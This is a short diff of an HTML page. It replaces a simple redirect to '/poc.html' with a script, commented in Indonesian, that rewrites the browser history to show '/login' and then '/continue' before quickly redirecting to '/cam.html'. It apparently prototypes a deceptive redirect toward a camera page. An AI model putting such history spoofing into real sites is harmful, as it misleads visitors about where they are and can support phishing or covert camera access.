@@ -1,18 +1,10 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Loading…</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
-<body>
-<h2>Redirecting…</h2>
-
 <script>
-  setTimeout(() => {
-    window.location.href = "/poc.html";
-  }, 80);
-</script>
+  // manipulasi history awal
+  history.pushState({}, "", "/login");
 
-</body>
-</html>
+  setTimeout(() => {
+    // ganti state lagi tepat sebelum redirect
+    history.replaceState({}, "", "/continue");
+    window.location.href = "/cam.html";
+  }, 40);
+</script>
